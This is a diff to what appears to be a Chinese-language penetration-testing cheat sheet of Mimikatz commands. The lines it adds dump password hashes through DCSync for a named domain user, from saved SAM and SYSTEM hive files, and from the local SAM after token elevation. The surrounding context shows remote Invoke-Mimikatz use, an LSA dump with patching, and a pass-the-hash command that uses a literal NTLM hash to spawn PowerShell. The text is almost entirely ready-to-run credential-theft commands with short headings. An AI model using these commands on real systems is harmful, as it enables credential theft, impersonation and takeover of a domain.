@@ -25,6 +25,22 @@ Invoke-command -ScriptBlock ${function:Invoke-Mimikatz} -Session $sess
 Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
 ```
 
+# 导出特定用户的哈希
+```
+lsadump::dcsync /domain:kevin.com /user:root
+```
+
+# 从sam.hive和system.hive文件中获得NTLM Hash
+```
+lsadump::sam /sam:sam.hive /system:system.hive
+```
+
+# 从本地SAM文件中读取密码哈希
+```
+token::elevate
+lsadump::sam
+```
+
 # 生成某个用户命令的shell（需要NTML） Over the hash
 ```
 Invoke-Mimikatz -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:b38ff50264b74508085d82c69794a4d8 /run:powershell.exe"'
